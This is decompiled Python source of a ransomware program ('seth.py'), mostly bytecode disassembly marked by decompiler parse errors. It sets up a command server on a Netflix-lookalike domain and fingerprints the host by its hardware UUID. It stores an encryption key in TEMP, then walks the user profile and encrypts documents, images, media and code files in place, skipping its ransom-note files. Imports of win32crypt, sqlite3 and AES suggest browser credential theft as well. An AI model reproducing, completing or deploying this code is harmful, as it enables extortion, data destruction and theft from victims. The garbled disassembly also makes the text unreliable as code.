# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: seth.py
import os, requests, subprocess, winreg, base64, json, sqlite3, urllib.request, win32crypt, win32gui, win32con
from Crypto.Cipher import AES
import shutil
from struct import unpack
import sys
from binascii import hexlify, unhexlify
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from base64 import b64decode
import hmac
from Crypto.Cipher import DES3
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad
from optparse import OptionParser
from cryptography.fernet import Fernet
from pathlib import Path
url = 'http://ntflx-confirmation.xyz/feS72Gw1zZ/'
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
keyPath = os.environ['TEMP'] + '\\r1KYwZvV6z.bin'
oldDat = os.environ['TEMP'] + '\\here5.bin'
profilePath = os.environ['USERPROFILE']
profilePathTest = 'C:\\Users'

def write_key--- This code section failed: ---

 L.  39         0  LOAD_GLOBAL              Fernet
                2  LOAD_METHOD              generate_key
                4  CALL_METHOD_0         0  ''
                6  STORE_FAST               'key'

 L.  40         8  LOAD_GLOBAL              open
               10  LOAD_GLOBAL              keyPath
               12  LOAD_STR                 'wb'
               14  CALL_FUNCTION_2       2  ''
               16  SETUP_WITH           44  'to 44'
               18  STORE_FAST               'key_file'

 L.  41        20  LOAD_FAST                'key_file'
               22  LOAD_METHOD              write
               24  LOAD_FAST                'key'
               26  CALL_METHOD_1         1  ''
               28  POP_TOP          
               30  POP_BLOCK        
               32  LOAD_CONST               None
               34  DUP_TOP          
               36  DUP_TOP          
               38  CALL_FUNCTION_3       3  ''
               40  POP_TOP          
               42  JUMP_FORWARD         60  'to 60'
             44_0  COME_FROM_WITH       16  '16'
               44  <49>             
               46  POP_JUMP_IF_TRUE     50  'to 50'
               48  <48>             
             50_0  COME_FROM            46  '46'
               50  POP_TOP          
               52  POP_TOP          
               54  POP_TOP          
               56  POP_EXCEPT       
               58  POP_TOP          
             60_0  COME_FROM            42  '42'

 L.  42        60  LOAD_GLOBAL              open
               62  LOAD_GLOBAL              oldDat
               64  LOAD_STR                 'w+'
               66  CALL_FUNCTION_2       2  ''
               68  STORE_FAST               'oldFile'

 L.  43        70  LOAD_FAST                'oldFile'
               72  LOAD_METHOD              write
               74  LOAD_STR                 'a'
               76  CALL_METHOD_1         1  ''
               78  POP_TOP          

Parse error at or near `DUP_TOP' instruction at offset 34


def load_key():
    return openkeyPath'rb'.read()


def encrypt--- This code section failed: ---

 L.  49         0  LOAD_GLOBAL              Fernet
                2  LOAD_FAST                'key'
                4  CALL_FUNCTION_1       1  ''
                6  STORE_FAST               'f'

 L.  50         8  LOAD_GLOBAL              open
               10  LOAD_FAST                'filename'
               12  LOAD_STR                 'rb'
               14  CALL_FUNCTION_2       2  ''
               16  SETUP_WITH           42  'to 42'
               18  STORE_FAST               'file'

 L.  52        20  LOAD_FAST                'file'
               22  LOAD_METHOD              read
               24  CALL_METHOD_0         0  ''
               26  STORE_FAST               'file_data'
               28  POP_BLOCK        
               30  LOAD_CONST               None
               32  DUP_TOP          
               34  DUP_TOP          
               36  CALL_FUNCTION_3       3  ''
               38  POP_TOP          
               40  JUMP_FORWARD         58  'to 58'
             42_0  COME_FROM_WITH       16  '16'
               42  <49>             
               44  POP_JUMP_IF_TRUE     48  'to 48'
               46  <48>             
             48_0  COME_FROM            44  '44'
               48  POP_TOP          
               50  POP_TOP          
               52  POP_TOP          
               54  POP_EXCEPT       
               56  POP_TOP          
             58_0  COME_FROM            40  '40'

 L.  54        58  LOAD_FAST                'f'
               60  LOAD_METHOD              encrypt
               62  LOAD_FAST                'file_data'
               64  CALL_METHOD_1         1  ''
               66  STORE_FAST               'encrypted_data'

 L.  56        68  LOAD_GLOBAL              open
               70  LOAD_FAST                'filename'
               72  LOAD_STR                 'wb'
               74  CALL_FUNCTION_2       2  ''
               76  SETUP_WITH          104  'to 104'
               78  STORE_FAST               'file'

 L.  57        80  LOAD_FAST                'file'
               82  LOAD_METHOD              write
               84  LOAD_FAST                'encrypted_data'
               86  CALL_METHOD_1         1  ''
               88  POP_TOP          
               90  POP_BLOCK        
               92  LOAD_CONST               None
               94  DUP_TOP          
               96  DUP_TOP          
               98  CALL_FUNCTION_3       3  ''
              100  POP_TOP          
              102  JUMP_FORWARD        120  'to 120'
            104_0  COME_FROM_WITH       76  '76'
              104  <49>             
              106  POP_JUMP_IF_TRUE    110  'to 110'
              108  <48>             
            110_0  COME_FROM           106  '106'
              110  POP_TOP          
              112  POP_TOP          
              114  POP_TOP          
              116  POP_EXCEPT       
              118  POP_TOP          
            120_0  COME_FROM           102  '102'

Parse error at or near `DUP_TOP' instruction at offset 32


def ListFiles--- This code section failed: ---

 L.  60         0  BUILD_LIST_0          0 
                2  STORE_FAST               'txtList'

 L.  61         4  LOAD_GLOBAL              load_key
                6  CALL_FUNCTION_0       0  ''
                8  STORE_FAST               'key'

 L.  62        10  LOAD_GLOBAL              os
               12  LOAD_METHOD              walk
               14  LOAD_FAST                'profileDir'
               16  CALL_METHOD_1         1  ''
               18  GET_ITER         
             20_0  COME_FROM          1206  '1206'
            20_22  FOR_ITER           1208  'to 1208'
               24  UNPACK_SEQUENCE_3     3 
               26  STORE_FAST               'root'
               28  STORE_FAST               'dirs'
               30  STORE_FAST               'files'

 L.  63        32  LOAD_FAST                'files'
               34  GET_ITER         
             36_0  COME_FROM          1204  '1204'
             36_1  COME_FROM          1182  '1182'
             36_2  COME_FROM          1172  '1172'
             36_3  COME_FROM          1138  '1138'
             36_4  COME_FROM          1104  '1104'
             36_5  COME_FROM          1070  '1070'
             36_6  COME_FROM          1036  '1036'
             36_7  COME_FROM          1002  '1002'
             36_8  COME_FROM           968  '968'
             36_9  COME_FROM           934  '934'
            36_10  COME_FROM           900  '900'
            36_11  COME_FROM           866  '866'
            36_12  COME_FROM           832  '832'
            36_13  COME_FROM           798  '798'
            36_14  COME_FROM           764  '764'
            36_15  COME_FROM           730  '730'
            36_16  COME_FROM           696  '696'
            36_17  COME_FROM           662  '662'
            36_18  COME_FROM           628  '628'
            36_19  COME_FROM           594  '594'
            36_20  COME_FROM           560  '560'
            36_21  COME_FROM           526  '526'
            36_22  COME_FROM           492  '492'
            36_23  COME_FROM           458  '458'
            36_24  COME_FROM           424  '424'
            36_25  COME_FROM           390  '390'
            36_26  COME_FROM           356  '356'
            36_27  COME_FROM           322  '322'
            36_28  COME_FROM           288  '288'
            36_29  COME_FROM           254  '254'
            36_30  COME_FROM           220  '220'
            36_31  COME_FROM           188  '188'
            36_32  COME_FROM           156  '156'
            36_33  COME_FROM           124  '124'
            36_34  COME_FROM            92  '92'
            36_35  COME_FROM            60  '60'
            36_38  FOR_ITER           1206  'to 1206'
               40  STORE_FAST               'file'

 L.  64        42  LOAD_FAST                'file'
               44  LOAD_METHOD              endswith
               46  LOAD_STR                 'HOW_DECRYPT_FILES.txt'
               48  JUMP_IF_TRUE_OR_POP    52  'to 52'
               50  LOAD_STR                 'Personal_ID.txt'
             52_0  COME_FROM            48  '48'
               52  CALL_METHOD_1         1  ''
               54  POP_JUMP_IF_FALSE    62  'to 62'

 L.  65        56  LOAD_STR                 'e'
               58  STORE_FAST               'e'
               60  JUMP_BACK            36  'to 36'
             62_0  COME_FROM            54  '54'

 L.  67        62  LOAD_FAST                'file'
               64  LOAD_METHOD              endswith
               66  LOAD_STR                 '.txt'
               68  CALL_METHOD_1         1  ''
               70  POP_JUMP_IF_FALSE    94  'to 94'

 L.  68        72  LOAD_FAST                'txtList'
               74  LOAD_METHOD              append
               76  LOAD_GLOBAL              os
               78  LOAD_ATTR                path
               80  LOAD_METHOD              join
               82  LOAD_FAST                'root'
               84  LOAD_FAST                'file'
               86  CALL_METHOD_2         2  ''
               88  CALL_METHOD_1         1  ''
               90  POP_TOP          
               92  JUMP_BACK            36  'to 36'
             94_0  COME_FROM            70  '70'

 L.  69        94  LOAD_FAST                'file'
               96  LOAD_METHOD              endswith
               98  LOAD_STR                 '.jpg'
              100  CALL_METHOD_1         1  ''
              102  POP_JUMP_IF_FALSE   126  'to 126'

 L.  70       104  LOAD_FAST                'txtList'
              106  LOAD_METHOD              append
              108  LOAD_GLOBAL              os
              110  LOAD_ATTR                path
              112  LOAD_METHOD              join
              114  LOAD_FAST                'root'
              116  LOAD_FAST                'file'
              118  CALL_METHOD_2         2  ''
              120  CALL_METHOD_1         1  ''
              122  POP_TOP          
              124  JUMP_BACK            36  'to 36'
            126_0  COME_FROM           102  '102'

 L.  71       126  LOAD_FAST                'file'
              128  LOAD_METHOD              endswith
              130  LOAD_STR                 '.ppt'
              132  CALL_METHOD_1         1  ''
              134  POP_JUMP_IF_FALSE   158  'to 158'

 L.  72       136  LOAD_FAST                'txtList'
              138  LOAD_METHOD              append
              140  LOAD_GLOBAL              os
              142  LOAD_ATTR                path
              144  LOAD_METHOD              join
              146  LOAD_FAST                'root'
              148  LOAD_FAST                'file'
              150  CALL_METHOD_2         2  ''
              152  CALL_METHOD_1         1  ''
              154  POP_TOP          
              156  JUMP_BACK            36  'to 36'
            158_0  COME_FROM           134  '134'

 L.  73       158  LOAD_FAST                'file'
              160  LOAD_METHOD              endswith
              162  LOAD_STR                 '.html'
              164  CALL_METHOD_1         1  ''
              166  POP_JUMP_IF_FALSE   190  'to 190'

 L.  74       168  LOAD_FAST                'txtList'
              170  LOAD_METHOD              append
              172  LOAD_GLOBAL              os
              174  LOAD_ATTR                path
              176  LOAD_METHOD              join
              178  LOAD_FAST                'root'
              180  LOAD_FAST                'file'
              182  CALL_METHOD_2         2  ''
              184  CALL_METHOD_1         1  ''
              186  POP_TOP          
              188  JUMP_BACK            36  'to 36'
            190_0  COME_FROM           166  '166'

 L.  75       190  LOAD_FAST                'file'
              192  LOAD_METHOD              endswith
              194  LOAD_STR                 '.css'
              196  CALL_METHOD_1         1  ''
              198  POP_JUMP_IF_FALSE   222  'to 222'

 L.  76       200  LOAD_FAST                'txtList'
              202  LOAD_METHOD              append
              204  LOAD_GLOBAL              os
              206  LOAD_ATTR                path
              208  LOAD_METHOD              join
              210  LOAD_FAST                'root'
              212  LOAD_FAST                'file'
              214  CALL_METHOD_2         2  ''
              216  CALL_METHOD_1         1  ''
              218  POP_TOP          
              220  JUMP_BACK            36  'to 36'
            222_0  COME_FROM           198  '198'

 L.  77       222  LOAD_FAST                'file'
              224  LOAD_METHOD              endswith
              226  LOAD_STR                 '.odx'
              228  CALL_METHOD_1         1  ''
          230_232  POP_JUMP_IF_FALSE   256  'to 256'

 L.  78       234  LOAD_FAST                'txtList'
              236  LOAD_METHOD              append
              238  LOAD_GLOBAL              os
              240  LOAD_ATTR                path
              242  LOAD_METHOD              join
              244  LOAD_FAST                'root'
              246  LOAD_FAST                'file'
              248  CALL_METHOD_2         2  ''
              250  CALL_METHOD_1         1  ''
              252  POP_TOP          
              254  JUMP_BACK            36  'to 36'
            256_0  COME_FROM           230  '230'

 L.  79       256  LOAD_FAST                'file'
              258  LOAD_METHOD              endswith
              260  LOAD_STR                 '.ppt'
              262  CALL_METHOD_1         1  ''
          264_266  POP_JUMP_IF_FALSE   290  'to 290'

 L.  80       268  LOAD_FAST                'txtList'
              270  LOAD_METHOD              append
              272  LOAD_GLOBAL              os
              274  LOAD_ATTR                path
              276  LOAD_METHOD              join
              278  LOAD_FAST                'root'
              280  LOAD_FAST                'file'
              282  CALL_METHOD_2         2  ''
              284  CALL_METHOD_1         1  ''
              286  POP_TOP          
              288  JUMP_BACK            36  'to 36'
            290_0  COME_FROM           264  '264'

 L.  81       290  LOAD_FAST                'file'
              292  LOAD_METHOD              endswith
              294  LOAD_STR                 '.pptx'
              296  CALL_METHOD_1         1  ''
          298_300  POP_JUMP_IF_FALSE   324  'to 324'

 L.  82       302  LOAD_FAST                'txtList'
              304  LOAD_METHOD              append
              306  LOAD_GLOBAL              os
              308  LOAD_ATTR                path
              310  LOAD_METHOD              join
              312  LOAD_FAST                'root'
              314  LOAD_FAST                'file'
              316  CALL_METHOD_2         2  ''
              318  CALL_METHOD_1         1  ''
              320  POP_TOP          
              322  JUMP_BACK            36  'to 36'
            324_0  COME_FROM           298  '298'

 L.  83       324  LOAD_FAST                'file'
              326  LOAD_METHOD              endswith
              328  LOAD_STR                 '.png'
              330  CALL_METHOD_1         1  ''
          332_334  POP_JUMP_IF_FALSE   358  'to 358'

 L.  84       336  LOAD_FAST                'txtList'
              338  LOAD_METHOD              append
              340  LOAD_GLOBAL              os
              342  LOAD_ATTR                path
              344  LOAD_METHOD              join
              346  LOAD_FAST                'root'
              348  LOAD_FAST                'file'
              350  CALL_METHOD_2         2  ''
              352  CALL_METHOD_1         1  ''
              354  POP_TOP          
              356  JUMP_BACK            36  'to 36'
            358_0  COME_FROM           332  '332'

 L.  85       358  LOAD_FAST                'file'
              360  LOAD_METHOD              endswith
              362  LOAD_STR                 '.doc'
              364  CALL_METHOD_1         1  ''
          366_368  POP_JUMP_IF_FALSE   392  'to 392'

 L.  86       370  LOAD_FAST                'txtList'
              372  LOAD_METHOD              append
              374  LOAD_GLOBAL              os
              376  LOAD_ATTR                path
              378  LOAD_METHOD              join
              380  LOAD_FAST                'root'
              382  LOAD_FAST                'file'
              384  CALL_METHOD_2         2  ''
              386  CALL_METHOD_1         1  ''
              388  POP_TOP          
              390  JUMP_BACK            36  'to 36'
            392_0  COME_FROM           366  '366'

 L.  87       392  LOAD_FAST                'file'
              394  LOAD_METHOD              endswith
              396  LOAD_STR                 '.docx'
              398  CALL_METHOD_1         1  ''
          400_402  POP_JUMP_IF_FALSE   426  'to 426'

 L.  88       404  LOAD_FAST                'txtList'
              406  LOAD_METHOD              append
              408  LOAD_GLOBAL              os
              410  LOAD_ATTR                path
              412  LOAD_METHOD              join
              414  LOAD_FAST                'root'
              416  LOAD_FAST                'file'
              418  CALL_METHOD_2         2  ''
              420  CALL_METHOD_1         1  ''
              422  POP_TOP          
              424  JUMP_BACK            36  'to 36'
            426_0  COME_FROM           400  '400'

 L.  89       426  LOAD_FAST                'file'
              428  LOAD_METHOD              endswith
              430  LOAD_STR                 '.pdf'
              432  CALL_METHOD_1         1  ''
          434_436  POP_JUMP_IF_FALSE   460  'to 460'

 L.  90       438  LOAD_FAST                'txtList'
              440  LOAD_METHOD              append
              442  LOAD_GLOBAL              os
              444  LOAD_ATTR                path
              446  LOAD_METHOD              join
              448  LOAD_FAST                'root'
              450  LOAD_FAST                'file'
              452  CALL_METHOD_2         2  ''
              454  CALL_METHOD_1         1  ''
              456  POP_TOP          
              458  JUMP_BACK            36  'to 36'
            460_0  COME_FROM           434  '434'

 L.  91       460  LOAD_FAST                'file'
              462  LOAD_METHOD              endswith
              464  LOAD_STR                 '.gif'
              466  CALL_METHOD_1         1  ''
          468_470  POP_JUMP_IF_FALSE   494  'to 494'

 L.  92       472  LOAD_FAST                'txtList'
              474  LOAD_METHOD              append
              476  LOAD_GLOBAL              os
              478  LOAD_ATTR                path
              480  LOAD_METHOD              join
              482  LOAD_FAST                'root'
              484  LOAD_FAST                'file'
              486  CALL_METHOD_2         2  ''
              488  CALL_METHOD_1         1  ''
              490  POP_TOP          
              492  JUMP_BACK            36  'to 36'
            494_0  COME_FROM           468  '468'

 L.  93       494  LOAD_FAST                'file'
              496  LOAD_METHOD              endswith
              498  LOAD_STR                 '.bmp'
              500  CALL_METHOD_1         1  ''
          502_504  POP_JUMP_IF_FALSE   528  'to 528'

 L.  94       506  LOAD_FAST                'txtList'
              508  LOAD_METHOD              append
              510  LOAD_GLOBAL              os
              512  LOAD_ATTR                path
              514  LOAD_METHOD              join
              516  LOAD_FAST                'root'
              518  LOAD_FAST                'file'
              520  CALL_METHOD_2         2  ''
              522  CALL_METHOD_1         1  ''
              524  POP_TOP          
              526  JUMP_BACK            36  'to 36'
            528_0  COME_FROM           502  '502'

 L.  95       528  LOAD_FAST                'file'
              530  LOAD_METHOD              endswith
              532  LOAD_STR                 '.bak'
              534  CALL_METHOD_1         1  ''
          536_538  POP_JUMP_IF_FALSE   562  'to 562'

 L.  96       540  LOAD_FAST                'txtList'
              542  LOAD_METHOD              append
              544  LOAD_GLOBAL              os
              546  LOAD_ATTR                path
              548  LOAD_METHOD              join
              550  LOAD_FAST                'root'
              552  LOAD_FAST                'file'
              554  CALL_METHOD_2         2  ''
              556  CALL_METHOD_1         1  ''
              558  POP_TOP          
              560  JUMP_BACK            36  'to 36'
            562_0  COME_FROM           536  '536'

 L.  97       562  LOAD_FAST                'file'
              564  LOAD_METHOD              endswith
              566  LOAD_STR                 '.avi'
              568  CALL_METHOD_1         1  ''
          570_572  POP_JUMP_IF_FALSE   596  'to 596'

 L.  98       574  LOAD_FAST                'txtList'
              576  LOAD_METHOD              append
              578  LOAD_GLOBAL              os
              580  LOAD_ATTR                path
              582  LOAD_METHOD              join
              584  LOAD_FAST                'root'
              586  LOAD_FAST                'file'
              588  CALL_METHOD_2         2  ''
              590  CALL_METHOD_1         1  ''
              592  POP_TOP          
              594  JUMP_BACK            36  'to 36'
            596_0  COME_FROM           570  '570'

 L.  99       596  LOAD_FAST                'file'
              598  LOAD_METHOD              endswith
              600  LOAD_STR                 '.mp3'
              602  CALL_METHOD_1         1  ''
          604_606  POP_JUMP_IF_FALSE   630  'to 630'

 L. 100       608  LOAD_FAST                'txtList'
              610  LOAD_METHOD              append
              612  LOAD_GLOBAL              os
              614  LOAD_ATTR                path
              616  LOAD_METHOD              join
              618  LOAD_FAST                'root'
              620  LOAD_FAST                'file'
              622  CALL_METHOD_2         2  ''
              624  CALL_METHOD_1         1  ''
              626  POP_TOP          
              628  JUMP_BACK            36  'to 36'
            630_0  COME_FROM           604  '604'

 L. 101       630  LOAD_FAST                'file'
              632  LOAD_METHOD              endswith
              634  LOAD_STR                 '.mp4'
              636  CALL_METHOD_1         1  ''
          638_640  POP_JUMP_IF_FALSE   664  'to 664'

 L. 102       642  LOAD_FAST                'txtList'
              644  LOAD_METHOD              append
              646  LOAD_GLOBAL              os
              648  LOAD_ATTR                path
              650  LOAD_METHOD              join
              652  LOAD_FAST                'root'
              654  LOAD_FAST                'file'
              656  CALL_METHOD_2         2  ''
              658  CALL_METHOD_1         1  ''
              660  POP_TOP          
              662  JUMP_BACK            36  'to 36'
            664_0  COME_FROM           638  '638'

 L. 103       664  LOAD_FAST                'file'
              666  LOAD_METHOD              endswith
              668  LOAD_STR                 '.mwv'
              670  CALL_METHOD_1         1  ''
          672_674  POP_JUMP_IF_FALSE   698  'to 698'

 L. 104       676  LOAD_FAST                'txtList'
              678  LOAD_METHOD              append
              680  LOAD_GLOBAL              os
              682  LOAD_ATTR                path
              684  LOAD_METHOD              join
              686  LOAD_FAST                'root'
              688  LOAD_FAST                'file'
              690  CALL_METHOD_2         2  ''
              692  CALL_METHOD_1         1  ''
              694  POP_TOP          
              696  JUMP_BACK            36  'to 36'
            698_0  COME_FROM           672  '672'

 L. 105       698  LOAD_FAST                'file'
              700  LOAD_METHOD              endswith
              702  LOAD_STR                 '.wav'
              704  CALL_METHOD_1         1  ''
          706_708  POP_JUMP_IF_FALSE   732  'to 732'

 L. 106       710  LOAD_FAST                'txtList'
              712  LOAD_METHOD              append
              714  LOAD_GLOBAL              os
              716  LOAD_ATTR                path
              718  LOAD_METHOD              join
              720  LOAD_FAST                'root'
              722  LOAD_FAST                'file'
              724  CALL_METHOD_2         2  ''
              726  CALL_METHOD_1         1  ''
              728  POP_TOP          
              730  JUMP_BACK            36  'to 36'
            732_0  COME_FROM           706  '706'

 L. 107       732  LOAD_FAST                'file'
              734  LOAD_METHOD              endswith
              736  LOAD_STR                 '.csv'
              738  CALL_METHOD_1         1  ''
          740_742  POP_JUMP_IF_FALSE   766  'to 766'

 L. 108       744  LOAD_FAST                'txtList'
              746  LOAD_METHOD              append
              748  LOAD_GLOBAL              os
              750  LOAD_ATTR                path
              752  LOAD_METHOD              join
              754  LOAD_FAST                'root'
              756  LOAD_FAST                'file'
              758  CALL_METHOD_2         2  ''
              760  CALL_METHOD_1         1  ''
              762  POP_TOP          
              764  JUMP_BACK            36  'to 36'
            766_0  COME_FROM           740  '740'

 L. 109       766  LOAD_FAST                'file'
              768  LOAD_METHOD              endswith
              770  LOAD_STR                 '.cab'
              772  CALL_METHOD_1         1  ''
          774_776  POP_JUMP_IF_FALSE   800  'to 800'

 L. 110       778  LOAD_FAST                'txtList'
              780  LOAD_METHOD              append
              782  LOAD_GLOBAL              os
              784  LOAD_ATTR                path
              786  LOAD_METHOD              join
              788  LOAD_FAST                'root'
              790  LOAD_FAST                'file'
              792  CALL_METHOD_2         2  ''
              794  CALL_METHOD_1         1  ''
              796  POP_TOP          
              798  JUMP_BACK            36  'to 36'
            800_0  COME_FROM           774  '774'

 L. 111       800  LOAD_FAST                'file'
              802  LOAD_METHOD              endswith
              804  LOAD_STR                 '.docm'
              806  CALL_METHOD_1         1  ''
          808_810  POP_JUMP_IF_FALSE   834  'to 834'

 L. 112       812  LOAD_FAST                'txtList'
              814  LOAD_METHOD              append
              816  LOAD_GLOBAL              os
              818  LOAD_ATTR                path
              820  LOAD_METHOD              join
              822  LOAD_FAST                'root'
              824  LOAD_FAST                'file'
              826  CALL_METHOD_2         2  ''
              828  CALL_METHOD_1         1  ''
              830  POP_TOP          
              832  JUMP_BACK            36  'to 36'
            834_0  COME_FROM           808  '808'

 L. 113       834  LOAD_FAST                'file'
              836  LOAD_METHOD              endswith
              838  LOAD_STR                 '.eml'
              840  CALL_METHOD_1         1  ''
          842_844  POP_JUMP_IF_FALSE   868  'to 868'

 L. 114       846  LOAD_FAST                'txtList'
              848  LOAD_METHOD              append
              850  LOAD_GLOBAL              os
              852  LOAD_ATTR                path
              854  LOAD_METHOD              join
              856  LOAD_FAST                'root'
              858  LOAD_FAST                'file'
              860  CALL_METHOD_2         2  ''
              862  CALL_METHOD_1         1  ''
              864  POP_TOP          
              866  JUMP_BACK            36  'to 36'
            868_0  COME_FROM           842  '842'

 L. 115       868  LOAD_FAST                'file'
              870  LOAD_METHOD              endswith
              872  LOAD_STR                 '.flv'
              874  CALL_METHOD_1         1  ''
          876_878  POP_JUMP_IF_FALSE   902  'to 902'

 L. 116       880  LOAD_FAST                'txtList'
              882  LOAD_METHOD              append
              884  LOAD_GLOBAL              os
              886  LOAD_ATTR                path
              888  LOAD_METHOD              join
              890  LOAD_FAST                'root'
              892  LOAD_FAST                'file'
              894  CALL_METHOD_2         2  ''
              896  CALL_METHOD_1         1  ''
              898  POP_TOP          
              900  JUMP_BACK            36  'to 36'
            902_0  COME_FROM           876  '876'

 L. 117       902  LOAD_FAST                'file'
              904  LOAD_METHOD              endswith
              906  LOAD_STR                 '.ppsx'
              908  CALL_METHOD_1         1  ''
          910_912  POP_JUMP_IF_FALSE   936  'to 936'

 L. 118       914  LOAD_FAST                'txtList'
              916  LOAD_METHOD              append
              918  LOAD_GLOBAL              os
              920  LOAD_ATTR                path
              922  LOAD_METHOD              join
              924  LOAD_FAST                'root'
              926  LOAD_FAST                'file'
              928  CALL_METHOD_2         2  ''
              930  CALL_METHOD_1         1  ''
              932  POP_TOP          
              934  JUMP_BACK            36  'to 36'
            936_0  COME_FROM           910  '910'

 L. 119       936  LOAD_FAST                'file'
              938  LOAD_METHOD              endswith
              940  LOAD_STR                 '.mov'
              942  CALL_METHOD_1         1  ''
          944_946  POP_JUMP_IF_FALSE   970  'to 970'

 L. 120       948  LOAD_FAST                'txtList'
              950  LOAD_METHOD              append
              952  LOAD_GLOBAL              os
              954  LOAD_ATTR                path
              956  LOAD_METHOD              join
              958  LOAD_FAST                'root'
              960  LOAD_FAST                'file'
              962  CALL_METHOD_2         2  ''
              964  CALL_METHOD_1         1  ''
              966  POP_TOP          
              968  JUMP_BACK            36  'to 36'
            970_0  COME_FROM           944  '944'

 L. 121       970  LOAD_FAST                'file'
              972  LOAD_METHOD              endswith
              974  LOAD_STR                 '.jpeg'
              976  CALL_METHOD_1         1  ''
          978_980  POP_JUMP_IF_FALSE  1004  'to 1004'

 L. 122       982  LOAD_FAST                'txtList'
              984  LOAD_METHOD              append
              986  LOAD_GLOBAL              os
              988  LOAD_ATTR                path
              990  LOAD_METHOD              join
              992  LOAD_FAST                'root'
              994  LOAD_FAST                'file'
              996  CALL_METHOD_2         2  ''
              998  CALL_METHOD_1         1  ''
             1000  POP_TOP          
             1002  JUMP_BACK            36  'to 36'
           1004_0  COME_FROM           978  '978'

 L. 123      1004  LOAD_FAST                'file'
             1006  LOAD_METHOD              endswith
             1008  LOAD_STR                 '.xls'
             1010  CALL_METHOD_1         1  ''
         1012_1014  POP_JUMP_IF_FALSE  1038  'to 1038'

 L. 124      1016  LOAD_FAST                'txtList'
             1018  LOAD_METHOD              append
             1020  LOAD_GLOBAL              os
             1022  LOAD_ATTR                path
             1024  LOAD_METHOD              join
             1026  LOAD_FAST                'root'
             1028  LOAD_FAST                'file'
             1030  CALL_METHOD_2         2  ''
             1032  CALL_METHOD_1         1  ''
             1034  POP_TOP          
             1036  JUMP_BACK            36  'to 36'
           1038_0  COME_FROM          1012  '1012'

 L. 125      1038  LOAD_FAST                'file'
             1040  LOAD_METHOD              endswith
             1042  LOAD_STR                 '.tif'
             1044  CALL_METHOD_1         1  ''
         1046_1048  POP_JUMP_IF_FALSE  1072  'to 1072'

 L. 126      1050  LOAD_FAST                'txtList'
             1052  LOAD_METHOD              append
             1054  LOAD_GLOBAL              os
             1056  LOAD_ATTR                path
             1058  LOAD_METHOD              join
             1060  LOAD_FAST                'root'
             1062  LOAD_FAST                'file'
             1064  CALL_METHOD_2         2  ''
             1066  CALL_METHOD_1         1  ''
             1068  POP_TOP          
             1070  JUMP_BACK            36  'to 36'
           1072_0  COME_FROM          1046  '1046'

 L. 127      1072  LOAD_FAST                'file'
             1074  LOAD_METHOD              endswith
             1076  LOAD_STR                 '.rtf'
             1078  CALL_METHOD_1         1  ''
         1080_1082  POP_JUMP_IF_FALSE  1106  'to 1106'

 L. 128      1084  LOAD_FAST                'txtList'
             1086  LOAD_METHOD              append
             1088  LOAD_GLOBAL              os
             1090  LOAD_ATTR                path
             1092  LOAD_METHOD              join
             1094  LOAD_FAST                'root'
             1096  LOAD_FAST                'file'
             1098  CALL_METHOD_2         2  ''
             1100  CALL_METHOD_1         1  ''
             1102  POP_TOP          
             1104  JUMP_BACK            36  'to 36'
           1106_0  COME_FROM          1080  '1080'

 L. 129      1106  LOAD_FAST                'file'
             1108  LOAD_METHOD              endswith
             1110  LOAD_STR                 '.m4a'
             1112  CALL_METHOD_1         1  ''
         1114_1116  POP_JUMP_IF_FALSE  1140  'to 1140'

 L. 130      1118  LOAD_FAST                'txtList'
             1120  LOAD_METHOD              append
             1122  LOAD_GLOBAL              os
             1124  LOAD_ATTR                path
             1126  LOAD_METHOD              join
             1128  LOAD_FAST                'root'
             1130  LOAD_FAST                'file'
             1132  CALL_METHOD_2         2  ''
             1134  CALL_METHOD_1         1  ''
             1136  POP_TOP          
             1138  JUMP_BACK            36  'to 36'
           1140_0  COME_FROM          1114  '1114'

 L. 131      1140  LOAD_FAST                'file'
             1142  LOAD_METHOD              endswith
             1144  LOAD_STR                 '.jar'
             1146  CALL_METHOD_1         1  ''
         1148_1150  POP_JUMP_IF_FALSE  1174  'to 1174'

 L. 132      1152  LOAD_FAST                'txtList'
             1154  LOAD_METHOD              append
             1156  LOAD_GLOBAL              os
             1158  LOAD_ATTR                path
             1160  LOAD_METHOD              join
             1162  LOAD_FAST                'root'
             1164  LOAD_FAST                'file'
             1166  CALL_METHOD_2         2  ''
             1168  CALL_METHOD_1         1  ''
             1170  POP_TOP          
             1172  JUMP_BACK            36  'to 36'
           1174_0  COME_FROM          1148  '1148'

 L. 133      1174  LOAD_FAST                'file'
             1176  LOAD_METHOD              endswith
             1178  LOAD_STR                 '.cpp'
             1180  CALL_METHOD_1         1  ''
             1182  POP_JUMP_IF_FALSE_BACK    36  'to 36'

 L. 134      1184  LOAD_FAST                'txtList'
             1186  LOAD_METHOD              append
             1188  LOAD_GLOBAL              os
             1190  LOAD_ATTR                path
             1192  LOAD_METHOD              join
             1194  LOAD_FAST                'root'
             1196  LOAD_FAST                'file'
             1198  CALL_METHOD_2         2  ''
             1200  CALL_METHOD_1         1  ''
             1202  POP_TOP          
             1204  JUMP_BACK            36  'to 36'
           1206_0  COME_FROM            36  '36'
             1206  JUMP_BACK            20  'to 20'
           1208_0  COME_FROM            20  '20'

 L. 136      1208  LOAD_FAST                'txtList'
             1210  GET_ITER         
           1212_0  COME_FROM          1252  '1252'
           1212_1  COME_FROM          1248  '1248'
           1212_2  COME_FROM          1230  '1230'
             1212  FOR_ITER           1256  'to 1256'
             1214  STORE_FAST               'name'

 L. 137      1216  SETUP_FINALLY      1232  'to 1232'

 L. 138      1218  LOAD_GLOBAL              encrypt
             1220  LOAD_FAST                'name'
             1222  LOAD_FAST                'key'
             1224  CALL_FUNCTION_2       2  ''
             1226  POP_TOP          
             1228  POP_BLOCK        
             1230  JUMP_BACK          1212  'to 1212'
           1232_0  COME_FROM_FINALLY  1216  '1216'

 L. 139      1232  POP_TOP          
             1234  POP_TOP          
             1236  POP_TOP          

 L. 140      1238  LOAD_GLOBAL              print
             1240  LOAD_FAST                'name'
             1242  CALL_FUNCTION_1       1  ''
             1244  POP_TOP          
             1246  POP_EXCEPT       
             1248  JUMP_BACK          1212  'to 1212'
             1250  <48>             
         1252_1254  JUMP_BACK          1212  'to 1212'
           1256_0  COME_FROM          1212  '1212'

Parse error at or near `JUMP_BACK' instruction at offset 1248


def ReadKey():
    f = openkeyPath'r'
    keyContent = f.read()
    return keyContent


def ContactLocker():
